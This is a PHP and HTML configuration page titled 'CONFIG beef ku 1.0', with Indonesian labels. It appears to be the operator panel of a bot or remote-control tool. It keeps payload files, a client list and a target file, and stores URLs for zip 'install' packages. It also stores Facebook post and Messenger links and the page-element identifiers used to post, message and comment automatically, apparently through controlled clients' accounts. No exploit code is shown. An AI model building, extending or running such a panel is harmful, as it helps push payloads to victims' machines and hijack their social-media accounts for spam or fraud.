 <html>

 <head>
    <title>CONFIG beef ku 1.0</title>
    <!--[if IE]><script type="text/javascript" src="excanvas.js"></script><![endif]-->
  </head>
<form action="" method="post">  

 url server.zip : <input type="text" name="edt_install_server"><br>
 url data.zip : <input type="text" name="edt_install_data"><br>
 url fb.zip : <input type="text" name="edt_install_fb"><br>
<input type="submit" name="enter_install" value="Enter"><br><br>


 link fb postingan : <input type="text" name="edt_link_postingan"><br>
 link fb postinganEdt : <input type="text" name="edt_link_postinganEdt"><br>
 link fb postinganMsg : <input type="text" name="edt_link_postinganMsg"><br>
<input type="submit" name="enter_link" value="Enter fb"><br><br>

 form fb postinganEdt : <input type="text" name="edt_form_postingan"><br>
 form fb postinganBtn : <input type="text" name="btn_form_postingan"><br>
 form fb messengerEdt : <input type="text" name="edt_form_messenger"><br>
 form fb messengerBtn : <input type="text" name="btn_form_messenger"><br>
 form fb komentarEdt : <input type="text" name="edt_form_komentar"><br>
 form fb komentarBtn : <input type="text" name="btn_form_komentar"><br>
<input type="submit" name="enter_form" value="Enter fb"><br><br>

</form>

</html>

<?php

if (is_dir("payloadout") != 1) {
    mkdir("payloadout");
}
if (is_dir("listclient") != 1) {
    mkdir("listclient");
}
if (!file_exists("inpayload.txt")) {
    $file = fopen("inpayload.txt", "w");
    fwrite($file, "null");
    fclose($file);
}
if (!file_exists("baleni.txt")) {
    $file = fopen("baleni.txt", "w");
    fwrite($file, "kosong");
    fclose($file);
}
if (!file_exists("outpayload.txt")) {
    $file = fopen("outpayload.txt", "w");
    fwrite($file, "null");
    fclose($file);
}
if (!file_exists("target.txt")) {
    $file = fopen("target.txt", "w");
    fwrite($file, "null");
    fclose($file);
}

if (!file_exists("listclient/semua")) {
    $file = fopen("listclient/semua", "w");
    fwrite($file, "null");
    fclose($file);
}


if (!file_exists("ping.txt")) {
    $file = fopen("ping.txt", "w");
    fwrite($file, "1");
    fclose($file);
}

if (!file_exists("swthread.txt")) {
    $file = fopen("swthread.txt", "w");
    fwrite($file, "mati");
    fclose($file);
}

if (!file_exists("swlinkfb.txt")) {
    $file = fopen("swlinkfb.txt", "w");
    fwrite($file, "mati");
    fclose($file);
}

if (!file_exists("swlformb.txt")) {
    $file = fopen("swformfb.txt", "w");
    fwrite($file, "mati");
    fclose($file);
}


if (!file_exists("install.txt")) {
	echo "<script>alert('data [install.txt] kosong secepatnya diisi');</script>";
}

if (isset($_POST['enter_install'])) {
	$data_server = $_POST['edt_install_server'];
    $data_data = $_POST['edt_install_data'];
    $data_fb = $_POST['edt_install_fb'];

	$data = ["url_install_server" => $data_server,
             "url_install_data" => $data_data,
             "url_install_fb" => $data_fb];
	
	$file = fopen("install.txt","w");
	fwrite($file, json_encode($data));
	fclose($file);
}

if (isset($_POST['enter_link'])) {
    $data_post = $_POST['edt_link_postingan'];
    $data_postEdt = $_POST['edt_link_postinganEdt'];
    $data_postMsg = $_POST['edt_link_postinganMsg'];

    $data = ["link_postingan" => $data_post,
             "link_postinganEdt" => $data_postEdt,
             "link_postinganMsg" => $data_postMsg];
    
    $file = fopen("linkfb.txt","w");
    fwrite($file, json_encode($data));
    fclose($file);
}

if (isset($_POST['enter_form'])) {
    $data_postEdt = $_POST['edt_form_postingan'];
    $data_postBtn = $_POST['btn_form_postingan'];
  
    $data_mesEdt = $_POST['edt_form_messenger'];
    $data_mesBtn = $_POST['btn_form_messenger'];
   
    $data_komEdt = $_POST['edt_form_komentar'];
    $data_komBtn = $_POST['btn_form_komentar'];
   
    $data = ["edt_form_postingan" => $data_postEdt,
             "btn_form_postingan" => $data_postBtn,

             "edt_form_messenger" => $data_mesEdt,
             "btn_form_messenger" => $data_mesBtn,

             "edt_form_komentar" => $data_komEdt,
             "btn_form_komentar" => $data_komBtn];
    
    $file = fopen("formfb.txt","w");
    fwrite($file, json_encode($data));
    fclose($file);
}


if(isset($_POST['enter']))  
{
	$data = $_POST['edt'];
	$file = fopen("update.txt","w");
	fwrite($file, $data);
	fclose($file);

	if ($data == "bantuan") {
		echo "sample install data <font color='blue'>server.zipshunpchttps://google.drive.HGLkhHgjhshunpc </font>";
	}else {
		header("Location: /client.php");
	}
}


echo "<br>PING: ";
$myfile = fopen("ping.txt", "r") or die("Gagal membuka file!");
echo fread($myfile,filesize("ping.txt"));
fclose($myfile);


echo "<br><h1>________ INSTALL _________</H1><br>";
$myfile = fopen("install.txt", "r") or die("Gagal membuka file!");
echo fread($myfile,filesize("install.txt"));
fclose($myfile);
echo "<br><h1>________ INSTALL ________</H1>";

echo "<br><h1>________ LINK FB _________</H1><br>";
$myfile = fopen("linkfb.txt", "r") or die("Gagal membuka file!");
echo fread($myfile,filesize("linkfb.txt"));
fclose($myfile);
echo "<br><h1>________ LINK FB ________</H1>";

echo "<br><h1>________ LINK FB FORM _________</H1><br>";
$myfile = fopen("formfb.txt", "r") or die("Gagal membuka file!");
echo fread($myfile,filesize("formfb.txt"));
fclose($myfile);
echo "<br><h1>________ LINK FB FORM ________</H1>";


?>
